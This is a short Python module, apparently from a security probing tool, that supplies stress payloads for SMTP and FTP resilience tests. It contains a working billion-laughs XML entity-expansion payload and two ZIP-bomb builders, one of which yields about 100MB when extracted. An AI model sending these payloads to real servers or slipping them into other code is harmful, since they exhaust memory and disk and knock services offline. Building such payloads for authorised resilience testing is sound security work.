"""Shared XML / ZIP stress payloads for SMTP ZIPXXE and FTP processing-resilience probes (DRY).

Do not import heavy optional deps here; keep this module safe for all entrypoints.
"""

from __future__ import annotations

import zipfile
from io import BytesIO

# Classic billion-laughs entity expansion (~10^9 "lol" when expanded; small on disk).
BILLION_LAUGHS_XML: str = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""


def build_minimal_zip_bomb() -> bytes:
    """Layered DEFLATE bomb: small on the wire, moderate expansion when extracted (lab-safe default)."""
    bio = BytesIO()
    data = b"\x00" * (10 * 1024)
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(20):
            zf.writestr(f"layer_{i}.bin", data)
    return bio.getvalue()


def build_full_zip_bomb() -> bytes:
    """High-ratio DEFLATE bomb: ~100KB compressed → ~100MB expanded (isolated labs only)."""
    bio = BytesIO()
    chunk = b"\x00" * (1024 * 1024)
    data_10mb = chunk * 10
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        for i in range(10):
            zf.writestr(f"bomb_{i}.bin", data_10mb)
    return bio.getvalue()
